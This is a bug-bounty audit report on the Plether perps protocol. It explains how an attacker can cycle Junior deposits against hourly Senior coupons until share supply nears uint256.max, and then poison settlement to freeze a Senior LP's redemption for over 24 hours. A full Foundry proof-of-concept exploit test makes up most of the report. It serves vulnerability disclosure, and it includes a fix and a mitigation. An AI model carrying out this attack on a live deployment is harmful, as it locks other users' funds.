# \#98985 [SC-High] Junior share-supply overflow rolls back Senior redemption funding

**Submitted on Nov 11th 2026 at 10:01:35 UTC by @thimthor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98985
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Relevant Context

Junior absorbs trader losses and funds the Senior coupon. Both reduce Junior principal without burning Junior shares. The [Plether LP documentation](https://docs.plether.com/how-plether-works/the-liquidity-pool-and-tranche-waterfall) describes this waterfall. The release uses an 8% annual Senior coupon, one-hour LP epochs, a 1 USDG minimum deposit, and no Junior deposit fee. The PoC uses the release risk settings and the 40 million USDG / 80% Senior admission limits.

The prior `LOW-72` issue concerned an indicative deposit quote when projected tranche principal is **zero**. That view fix and the existing zero-principal activation deferral do not cover the positive-principal state below.

## Finding Description

With no deposit fee, `TrancheVault.quoteDepositFromState()` prices a Junior deposit as `floor(assets × (supply + 1,000) / (principal + 1))`. It checks that the quote itself fits in `uint256`, but does not check that the quote fits **beside the existing supply**:

```solidity
// TrancheVault.quoteDepositFromState
@> shares = Math.mulDiv(netAssets, pricingSupply + VIRTUAL_SHARES, denominator, Math.Rounding.Floor);

// TrancheVault.finalizeDepositEpochFromPool
depositClaimEscrowShares += shares;
IERC20(asset()).safeTransfer(address(POOL), assets);
@> _mint(address(this), shares);
```

After a large trader win leaves Junior principal near zero, an attacker can repeatedly request a deposit equal to the next hourly Senior coupon. Each settlement first charges that coupon to Junior, then activates the deposit. Junior principal returns to roughly the same small value while Junior supply grows. The PoC repeats this for 36 epochs and makes a final deposit that leaves supply close to `uint256.max`.

The attacker queues a 1 USDG Junior deposit in the next epoch, after an unrelated Senior LP has queued redemption. Its quoted shares are individually representable, but `totalSupply + shares` overflows in OpenZeppelin's checked ERC-20 mint. The test checks that the quote exceeds remaining supply headroom but fits in the claim escrow. The failure occurs after `HousePool._settleLpEpoch()` funds Senior redemptions and before the call returns:

```solidity
// HousePool._settleLpEpoch
@> seniorPhase = _fundRedemptionPhase(
    seniorVault, result.cutoffEpoch, seniorPhase, _settlementFeeBps(true, statusSnapshot.oracleFrozen)
);
// Other redemption work and entry checks follow.
@> juniorDepositPhase = _settleDepositPhase(juniorVault, result.cutoffEpoch, juniorDepositPhase, 0, false);
```

The revert rolls back Senior funding, the coupon checkpoint, and queue progress. The poisoned Junior deposit remains at the queue head. In the PoC's healthy, positive-principal state, its owner cannot cancel it after maturity.

## Impact Explanation

The test queues about 40.05 million USDG of Senior principal for redemption and shows that the pool has enough cash to fund it. Coupon accrual can raise existing Senior principal above the 40 million USDG limit for admitting new deposits. Settlement instead reverts at the Junior mint, leaving the Senior LP with no claimable redemption assets. The same failure and unfunded claim persist on a retry 24 hours later. This meets the [competition rules](https://immunefi.com/audit-competition/plether/scope/) for High severity, temporary freezing of funds for at least 24 hours.

This is a conditional freeze. An owner or guardian entry pause defers Junior deposit activation and allows the Senior redemption to fund; the PoC verifies the paused settlement behavior. If no other principal changes occur, accrued coupon eventually reduces Junior principal to zero, where the existing zero-principal deferral also allows redemption funding. The competition rules require demonstrated monitoring coverage and response timing before counting an emergency pause as a severity reduction.

## Recommendation

Before finalizing an LP deposit epoch, check that both the virtual-share addition used by the quote and the marginal mint fit within `uint256`. If the mint exceeds remaining supply, reject or defer that epoch without reverting redemption funding. Use the actual post-redemption supply and batch quote at settlement; a request-time estimate cannot cover later losses and coupon accrual.


## Proof of Concept

## Proof of Concept

Add the following file to `packages/perps/test/perps/spec/lp/CouponCyclingSupplyOverflow.t.sol` in a fresh checkout, then run:

```bash
forge test --root packages/perps --match-contract CouponCyclingSupplyOverflowTest -vv
```

Result from the run: one test passed. It observed an arithmetic panic at the Junior mint both when the Senior exit matured and 24 hours later; the Senior claim stayed at zero after both failed settlements. Pausing entry then funded the Senior claim for 40,058,836.572253 USDG.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {stdError} from "forge-std/StdError.sol";

contract CouponCyclingSupplyOverflowTest is BasePerpTest {

    address private constant JUNIOR_LP = address(0xA11CE);
    address private constant SENIOR_LP = address(0xB0B);
    address private constant ATTACKER = address(0xBAD);
    address private constant TRADER = address(0xCAFE);

    uint256 private constant ENTRY_PRICE = 1e8;
    uint256 private constant POSITION_LOTS = 200_000;
    uint256 private constant POSITION_SIZE = POSITION_LOTS * 100e18;
    uint256 private constant COUPON_DENOMINATOR = 10_000 * 365 days;
    uint256 private constant TARGET_JUNIOR_DUST = 10e6;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);

        // These public deposits put the pool at the release's $40M Senior limit and 80% covenant.
        // The one-dollar Junior cushion covers coupon rounding while the Senior request is pending.
        _fundJunior(JUNIOR_LP, 10_000_000e6);
        _fundSenior(SENIOR_LP, 39_999_998e6);

        // Configuration activation advanced the fixture to Thursday. Start the attack on the next Monday so
        // its hourly amplification epochs remain inside the documented market calendar.
        vm.warp(1_710_151_200);
    }

    function test_CouponCyclingFreezesFortyMillionForMoreThan24Hours() public {
        uint256 firstDepositId;
        uint256 activationTime;
        uint256 firstDepositAssets;
        uint256 couponAtLoss;
        (firstDepositId, activationTime, firstDepositAssets, couponAtLoss) = _queueFirstAmplificationDeposit();

        // The 20M-token SHORT is exactly the release's 40% skew limit. A protocol-valid but extreme
        // in-range price win removes almost all Junior capital. The production lens selects the exact exit.
        _fundTrader(TRADER, 300_000e6);
        _openThroughRouter(TRADER, CfdTypes.Side.SHORT, POSITION_SIZE, 200_000e6, ENTRY_PRICE);
        uint256 targetPoolAssets = pool.seniorPrincipal() + couponAtLoss + TARGET_JUNIOR_DUST;
        uint256 exitPrice = _highestPriceLeavingPoolAssets(targetPoolAssets);
        assertLt(exitPrice, CAP_PRICE, "the loss uses an in-range oracle price");
        assertEq(exitPrice, 149_879_084, "the release-path exit price must remain reproducible");
        emit log_named_decimal_uint("extreme exit price", exitPrice, 8);
        _closeThroughRouter(TRADER, CfdTypes.Side.SHORT, POSITION_SIZE, exitPrice);

        vm.warp(activationTime);
        pool.settleLpEpoch(0, 0);

        uint256 dust = pool.juniorPrincipal() - firstDepositAssets;
        assertGe(dust, TARGET_JUNIOR_DUST, "the trade must preserve positive Junior value");
        assertLt(dust, TARGET_JUNIOR_DUST + 1e6, "price granularity should leave less than one extra dollar");
        _claimJuniorDeposit(firstDepositId, ATTACKER);

        // Every activated deposit equals the coupon due in the following epoch. Coupon processing
        // therefore returns Junior to the same dust value before pricing each new deposit.
        uint256 cycles;
        while (true) {
            uint256 currentCoupon = _coupon(pool.seniorPrincipal(), 1 hours);
            uint256 followingCoupon = _coupon(pool.seniorPrincipal() + currentCoupon, 1 hours);
            uint256 projectedShares =
                juniorVault.quoteDepositFromState(followingCoupon, dust, juniorVault.totalSupply(), 0);
            uint256 projectedSupply = juniorVault.totalSupply() + projectedShares;
            uint256 projectedMaxSafeDeposit = _maxSafeDepositAssets(dust, projectedSupply);
            uint256 projectedSenior = pool.seniorPrincipal() + currentCoupon;
            uint256 requiredForTwentyFiveHours = _coupon(projectedSenior, 25 hours) + 1;
            if (projectedMaxSafeDeposit <= requiredForTwentyFiveHours) {
                break;
            }

            uint256 requestId = _requestJuniorDeposit(ATTACKER, followingCoupon);
            vm.warp(juniorVault.depositEpochStart(requestId));
            pool.settleLpEpoch(0, 0);
            assertEq(pool.juniorPrincipal() - followingCoupon, dust, "coupon cycling must restore the pricing dust");
            _claimJuniorDeposit(requestId, ATTACKER);
            cycles++;
            assertLt(cycles, 64, "the construction should converge well before the loop bound");
        }

        // Use the largest deposit whose quoted shares still fit. Subtracting one asset atom leaves
        // a small safety margin while placing total supply close enough to uint256.max to poison the next mint.
        uint256 nearMaxAssets = _maxSafeDepositAssets(dust, juniorVault.totalSupply()) - 1;
        uint256 couponForTwentyFiveHours = _coupon(pool.seniorPrincipal(), 25 hours);
        assertGt(nearMaxAssets + dust, couponForTwentyFiveHours, "Junior must remain positive for over 24 hours");
        assertLt(nearMaxAssets, 1_000_000e6, "the final tuning deposit stays below $1M");

        uint256 nearMaxId = _requestJuniorDeposit(ATTACKER, nearMaxAssets);
        (, uint256 cutoffTime) = juniorVault.getRequestEpochWindow();
        vm.warp(cutoffTime);

        // The unrelated Senior LP queues an exit first. The attacker then poisons its settlement epoch.
        uint256 seniorShares = seniorVault.balanceOf(SENIOR_LP);
        vm.prank(SENIOR_LP);
        uint256 seniorRedeemId = seniorVault.requestRedeem(seniorShares, SENIOR_LP, SENIOR_LP);

        // The poison request is admitted before the near-max activation, then left uncancelled.
        uint256 poisonId = _requestJuniorDeposit(ATTACKER, 1e6);
        assertEq(poisonId, nearMaxId + 1, "the poison request must mature one epoch later");
        assertEq(seniorRedeemId, poisonId, "the Senior exit must mature with the poisoned deposit");

        vm.warp(juniorVault.depositEpochStart(nearMaxId));
        pool.settleLpEpoch(0, 0);
        _claimJuniorDeposit(nearMaxId, ATTACKER);
        uint256 supplyBeforePoison = juniorVault.totalSupply();
        uint256 checkpointBeforePoison = pool.lastSeniorCouponCheckpointTime();
        uint256 poolBalanceBeforePoison = settlementToken.balanceOf(address(pool));
        assertEq(juniorVault.depositClaimEscrowShares(), 0, "all successful attacker deposits must be claimed");

        emit log_named_uint("coupon-matched amplification epochs", cycles);
        emit log_named_decimal_uint("near-max tuning deposit", nearMaxAssets, 6);
        emit log_named_uint("Junior supply before poison", supplyBeforePoison);
        emit log_named_decimal_uint("Junior principal after tuning", pool.juniorPrincipal(), 6);
        emit log_named_decimal_uint(
            "additional Junior principal needed at first failure", _additionalPrincipalRequired(1 hours), 6
        );
        emit log_named_decimal_uint(
            "additional Junior principal needed after 24 hours", _additionalPrincipalRequired(25 hours), 6
        );
        emit log_named_decimal_uint("Senior principal blocked by poison", pool.seniorPrincipal(), 6);

        vm.warp(juniorVault.depositEpochStart(poisonId));
        uint256 firstPoisonQuote = _assertPoisonQuoteOverflowsSupply(1 hours, supplyBeforePoison);
        emit log_named_uint("poison quoted shares at first failure", firstPoisonQuote);
        emit log_named_uint("totalSupply headroom at first failure", type(uint256).max - supplyBeforePoison);
        emit log_named_uint(
            "claim escrow headroom at first failure", type(uint256).max - juniorVault.depositClaimEscrowShares()
        );
        vm.expectRevert(stdError.arithmeticError);
        pool.settleLpEpoch(0, 0);
        _assertSettlementRolledBack(
            poisonId, seniorRedeemId, seniorShares, checkpointBeforePoison, poolBalanceBeforePoison, supplyBeforePoison
        );

        // Failed calls never advance the coupon checkpoint. Twenty-four hours after the first failure,
        // Junior principal is still positive and the same poison request still reverts settlement.
        vm.warp(juniorVault.depositEpochStart(poisonId) + 24 hours);
        uint256 retryPoisonQuote = _assertPoisonQuoteOverflowsSupply(25 hours, supplyBeforePoison);
        emit log_named_uint("poison quoted shares after 24 hours", retryPoisonQuote);
        vm.expectRevert(stdError.arithmeticError);
        pool.settleLpEpoch(0, 0);
        _assertSettlementRolledBack(
            poisonId, seniorRedeemId, seniorShares, checkpointBeforePoison, poolBalanceBeforePoison, supplyBeforePoison
        );

        vm.prank(ATTACKER);
        vm.expectRevert(TrancheVault.TrancheVault__DepositEpochAlreadyActive.selector);
        juniorVault.cancelPendingDeposit(poisonId, ATTACKER, ATTACKER);

        // Owner or pauser containment is effective. Pausing deposit activation lets the already queued
        // Senior redemption settle, but the attacker's poison deposit remains pending and cannot be cancelled.
        pool.pause();
        vm.prank(ATTACKER);
        vm.expectRevert(TrancheVault.TrancheVault__DepositEpochAlreadyActive.selector);
        juniorVault.cancelPendingDeposit(poisonId, ATTACKER, ATTACKER);
        uint256 poolAssetsBeforeContainment = settlementToken.balanceOf(address(pool));
        IHousePool.LpEpochSettlementResult memory containment = pool.settleLpEpoch(0, 0);
        uint256 claimableSeniorAssets = seniorVault.claimableRedeemAssets(seniorRedeemId, SENIOR_LP);
        emit log_named_decimal_uint("Senior redemption released by pause", claimableSeniorAssets, 6);
        assertEq(claimableSeniorAssets, containment.seniorFundedAssets, "result must report the exact funded assets");
        assertEq(containment.seniorFundedShares, seniorShares, "pause must fund every queued Senior share");
        assertEq(
            poolAssetsBeforeContainment - settlementToken.balanceOf(address(pool)),
            claimableSeniorAssets,
            "the vault's claimable assets must equal the pool transfer"
        );
        assertGt(claimableSeniorAssets, 39_000_000e6, "pause must release the blocked Senior exit");
        assertEq(juniorVault.pendingDepositRequest(poisonId, ATTACKER), 1e6, "pause defers the poison deposit");
    }

    function _queueFirstAmplificationDeposit()
        private
        returns (uint256 requestId, uint256 activationTime, uint256 assets, uint256 couponAtActivation)
    {
        (requestId,) = juniorVault.getRequestEpochWindow();
        activationTime = juniorVault.depositEpochStart(requestId);
        uint256 elapsed = activationTime - pool.lastSeniorCouponCheckpointTime();
        couponAtActivation = _coupon(pool.seniorPrincipal(), elapsed);
        assets = _coupon(pool.seniorPrincipal() + couponAtActivation, 1 hours);
        assertEq(_requestJuniorDeposit(ATTACKER, assets), requestId);
    }

    function _highestPriceLeavingPoolAssets(
        uint256 targetPoolAssets
    ) private view returns (uint256 price) {
        uint256 low = ENTRY_PRICE;
        uint256 high = CAP_PRICE - 1;
        while (low < high) {
            uint256 mid = (low + high + 1) / 2;
            ICfdEngineTypes.ClosePreview memory preview = engineLens.previewClose(TRADER, POSITION_SIZE, mid);
            if (preview.valid && preview.effectiveAssetsAfterAssets >= targetPoolAssets) {
                low = mid;
            } else {
                high = mid - 1;
            }
        }
        return low;
    }

    function _maxSafeDepositAssets(
        uint256 pricingAssets,
        uint256 pricingSupply
    ) private pure returns (uint256) {
        uint256 remainingSupply = type(uint256).max - pricingSupply;
        return Math.mulDiv(remainingSupply + 1, pricingAssets + 1, pricingSupply + 1000, Math.Rounding.Ceil) - 1;
    }

    function _assertPoisonQuoteOverflowsSupply(
        uint256 couponElapsed,
        uint256 supplyBeforePoison
    ) private view returns (uint256 quotedShares) {
        uint256 coupon = _coupon(pool.seniorPrincipal(), couponElapsed);
        assertLt(coupon, pool.juniorPrincipal(), "coupon must not reach the zero-principal recovery state");
        uint256 pricingAssets = pool.juniorPrincipal() - coupon;
        quotedShares = juniorVault.quoteDepositFromState(1e6, pricingAssets, supplyBeforePoison, 0);
        assertGt(quotedShares, type(uint256).max - supplyBeforePoison, "the quote must overflow only when added");
        assertLe(
            quotedShares,
            type(uint256).max - juniorVault.depositClaimEscrowShares(),
            "claim escrow must have room before ERC20 minting"
        );
    }

    function _claimJuniorDeposit(
        uint256 requestId,
        address controller
    ) private returns (uint256 shares) {
        uint256 assets = juniorVault.claimableDepositRequest(requestId, controller);
        assertGt(assets, 0, "the successful deposit must be claimable");
        vm.prank(controller);
        shares = juniorVault.claimDeposit(requestId, assets, controller, controller);
        assertGt(shares, 0, "the public claim must deliver shares");
        assertEq(juniorVault.depositClaimEscrowShares(), 0, "the claim must clear share escrow");
    }

    function _additionalPrincipalRequired(
        uint256 couponElapsed
    ) private view returns (uint256) {
        uint256 supply = juniorVault.totalSupply();
        uint256 supplyHeadroom = type(uint256).max - supply;
        uint256 minimumPricingAssets = Math.mulDiv(1e6, supply + 1000, supplyHeadroom + 1);
        uint256 coupon = _coupon(pool.seniorPrincipal(), couponElapsed);
        uint256 pricingAssets = pool.juniorPrincipal() - coupon;
        return minimumPricingAssets > pricingAssets ? minimumPricingAssets - pricingAssets : 0;
    }

    function _assertSettlementRolledBack(
        uint256 poisonId,
        uint256 seniorRedeemId,
        uint256 seniorShares,
        uint256 checkpointBeforePoison,
        uint256 poolBalanceBeforePoison,
        uint256 supplyBeforePoison
    ) private view {
        assertEq(pool.lastSeniorCouponCheckpointTime(), checkpointBeforePoison, "coupon checkpoint must roll back");
        assertEq(settlementToken.balanceOf(address(pool)), poolBalanceBeforePoison, "Senior funding must roll back");
        assertEq(juniorVault.totalSupply(), supplyBeforePoison, "the overflowing mint must roll back");
        assertEq(seniorVault.claimableRedeemAssets(seniorRedeemId, SENIOR_LP), 0, "Senior assets remain blocked");
        assertEq(seniorVault.pendingRedeemRequest(seniorRedeemId, SENIOR_LP), seniorShares);
        assertEq(juniorVault.pendingDepositRequest(poisonId, ATTACKER), 1e6);
    }

    function _coupon(
        uint256 seniorPrincipal,
        uint256 elapsed
    ) private view returns (uint256) {
        return seniorPrincipal * pool.seniorRateBps() * elapsed / COUPON_DENOMINATOR;
    }

    function _requestJuniorDeposit(
        address depositor,
        uint256 assets
    ) private returns (uint256 requestId) {
        settlementToken.mint(depositor, assets);
        vm.startPrank(depositor);
        settlementToken.approve(address(juniorVault), assets);
        requestId = juniorVault.requestDeposit(assets, depositor, depositor);
        vm.stopPrank();
    }

    function _openThroughRouter(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 price
    ) private {
        vm.prank(account);
        uint64 orderId = router.commitOrder(side, size, margin, price, false);
        vm.prank(account);
        router.executeOrder(orderId, _mockPythUpdateData(price));
    }

    function _closeThroughRouter(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 price
    ) private {
        // The two equal mock feeds average one atom below an odd input. Give a SHORT close that atom of slippage room.
        uint256 targetPrice = side == CfdTypes.Side.SHORT ? price - 1 : price;
        vm.prank(account);
        uint64 orderId = router.commitOrder(side, size, 0, targetPrice, true);
        vm.prank(account);
        router.executeOrder(orderId, _mockPythUpdateData(price));
    }

}
```
